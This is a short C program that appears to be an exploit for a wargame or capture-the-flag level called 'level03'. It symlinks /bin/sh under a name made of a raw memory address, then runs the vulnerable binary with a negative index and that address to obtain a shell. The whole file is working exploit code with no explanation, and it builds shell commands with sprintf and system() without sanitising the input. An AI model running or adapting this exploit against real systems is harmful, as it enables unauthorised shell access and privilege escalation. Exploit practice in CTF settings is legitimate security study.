#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv) {
    char *shell = "/bin/sh";
    char *vuln = "./level03";
    char *arg1 = "-27";
    char *arg2 = "\xac\x84\x04\x08";

    // Create symbolic link
    char cmd[256];
    sprintf(cmd, "ln -s %s %s", shell, arg2);
    system(cmd);

    // Run vulnerable program
    char vulncmd[256];
    sprintf(vulncmd, "%s %s %s", vuln, arg1, arg2);
    system(vulncmd);

    return 0;
}